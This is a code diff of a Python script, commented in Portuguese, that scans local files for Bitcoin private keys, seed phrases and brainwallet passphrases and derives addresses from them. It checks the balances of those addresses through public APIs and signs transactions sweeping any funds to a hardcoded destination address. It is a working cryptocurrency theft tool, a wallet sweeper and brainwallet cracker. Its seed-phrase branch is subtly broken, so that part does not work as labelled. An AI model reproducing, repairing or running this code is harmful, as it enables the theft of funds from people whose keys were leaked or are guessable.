@@ -5,24 +5,14 @@ import sys
 import hashlib
 from bitcoinlib.keys import Key
 from bitcoinlib.transactions import Transaction
+from bitcoinlib.mnemonic import Mnemonic
 
 # --- CONFIGURAÇÕES ---
 DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
 FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']
 
-def deep_clean_rtf(raw_content):
-    """Remove metadados RTF para limpar chaves fragmentadas"""
-    text = re.sub(r'\\[a-z0-9]+(?:\s|-?\d+)?', '', raw_content)
-    text = re.sub(r'[{}]', '', text)
-    return "".join(text.split())
-
 def check_balance_api(address):
-    """Consulta saldo em múltiplas APIs"""
-    apis = [
-        f"https://mempool.space/api/address/{address}",
-        f"https://blockstream.info/api/address/{address}"
-    ]
-    for api_url in apis:
+    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
         try:
             r = requests.get(api_url, timeout=10)
             if r.status_code == 200:
@@ -33,83 +23,80 @@ def check_balance_api(address):
     return 0
 
 def create_hex_transaction(addr, wif, utxos_val):
-    """Cria e assina a transação, gerando o HEX para o Shell"""
     try:
         r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
-        if r.status_code != 200: return
         utxos = r.json()
         if not utxos: return
-
         tx = Transaction(network='bitcoin')
-        fee = 32000 # Taxa agressiva para prioridade
+        fee = 35000
         amount = utxos_val - fee
-        
         if amount > 1000:
             for u in utxos:
                 tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
             tx.add_output(value=amount, address=DEST_ADDRESS)
             tx.sign([wif])
-            
-            # Formato que o script Shell captura
             print(f"HEX_GEN:{tx.raw_hex()}")
             sys.stdout.flush()
-        else:
-            print(f"⚠️ Saldo insuficiente para taxa em {addr}")
-            sys.stdout.flush()
-    except Exception as e:
-        print(f"💥 Erro ao assinar {addr}: {e}")
-        sys.stdout.flush()
+    except Exception: pass
 
-def run_nuclear_scan():
-    print("☢️ INICIANDO VARREDURA TOTAL (WIF + HEX + DERIVAÇÕES)...")
+def process_key(key_material, is_seed=False):
+    """Testa derivações para uma chave ou semente"""
+    try:
+        # Se for semente BIP39, gera a chave privada da conta 0
+        if is_seed:
+            kb = Key(key_material, network='bitcoin')
+        else:
+            kb = Key(key_material, network='bitcoin')
+
+        for comp in [True, False]:
+            k = Key(kb.private_byte, network='bitcoin', compressed=comp)
+            for addr_type in ['legacy', 'p2sh-segwit', 'segwit']:
+                addr = k.address(witness_type=addr_type if addr_type != 'legacy' else None)
+                balance = check_balance_api(addr)
+                if balance > 0:
+                    print(f"💰 SUCESSO! Endereço: {addr} | Saldo: {balance}")
+                    print(f"🔑 Origem: {key_material[:15]}...")
+                    create_hex_transaction(addr, k.wif(), balance)
+                    sys.stdout.flush()
+    except: pass
+
+def run_ultra_scan():
+    print("🚀 INICIANDO ULTRA SCAN: BIP39 + BRAIN + HEX + WIF")
     sys.stdout.flush()
     
-    potential_keys = set()
-    target_addresses = set()
+    potential_stuff = set()
     
-    # 1. Extração de dados
     for file_path in FILES_TO_SCAN:
         try:
             with open(file_path, 'r', errors='ignore') as f:
                 content = f.read()
-                if file_path.endswith('.rtf'):
-                    content = deep_clean_rtf(content)
+                # 1. Captura frases de 12-24 palavras (BIP39)
+                words = re.findall(r'\b(?:[a-z]{3,10}\s+){11,23}[a-z]{3,10}\b', content.lower())
+                for w in words: potential_stuff.add(('bip39', w))
                 
-                # Captura WIFs e HEX de 64 caracteres
-                potential_keys.update(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
-                potential_keys.update(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
-                # Captura endereços para log de referência
-                target_addresses.update(re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', content))
+                # 2. Captura HEX e WIF
+                for h in re.findall(r'[0-9a-fA-F]{64}', content): potential_stuff.add(('hex', h))
+                for wif in re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content): potential_stuff.add(('wif', wif))
+                
+                # 3. Brainwallet de cada linha não vazia
+                for line in content.splitlines():
+                    line = line.strip()
+                    if len(line) > 5: potential_stuff.add(('brain', line))
         except: continue
 
-    print(f"📊 Endereços no arquivo: {len(target_addresses)}")
-    print(f"🔑 Chaves para testar: {len(potential_keys)}")
+    print(f"📊 Itens para processar: {len(potential_stuff)}")
     sys.stdout.flush()
 
-    # 2. Varredura de saldos nos endereços encontrados (Apenas para Log)
-    for addr in target_addresses:
-        bal = check_balance_api(addr)
-        if bal > 0:
-            print(f"🚨 ALVO COM SALDO: {addr} | {bal} sats")
-            sys.stdout.flush()
-
-    # 3. Cruzamento de Chaves (Força Bruta de Derivação)
-    print("🔄 Cruzando chaves privadas com formatos de rede...")
-    for key_item in potential_keys:
-        for is_comp in [True, False]:
-            try:
-                # Converte HEX/WIF seguindo padrão Base58Check
-                k = Key(key_item, network='bitcoin', compressed=is_comp)
-                
-                # Testa todos os endereços que esta chave pode gerar
-                for addr_gen in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
-                    balance = check_balance_api(addr_gen)
-                    if balance > 0:
-                        print(f"💰 CHAVE VÁLIDA! {addr_gen} | Saldo: {balance} sats")
-                        sys.stdout.flush()
-                        create_hex_transaction(addr_gen, k.wif(), balance)
-            except: continue
-        time.sleep(0.02) # Evita Rate Limit
+    for type, value in potential_stuff:
+        if type == 'bip39':
+            process_key(value, is_seed=True)
+        elif type == 'hex':
+            process_key(bytes.fromhex(value))
+        elif type == 'wif':
+            process_key(value)
+        else: # Brainwallet
+            process_key(hashlib.sha256(value.encode()).digest())
+        time.sleep(0.01)
 
 if __name__ == "__main__":
-    run_nuclear_scan()
+    run_ultra_scan()
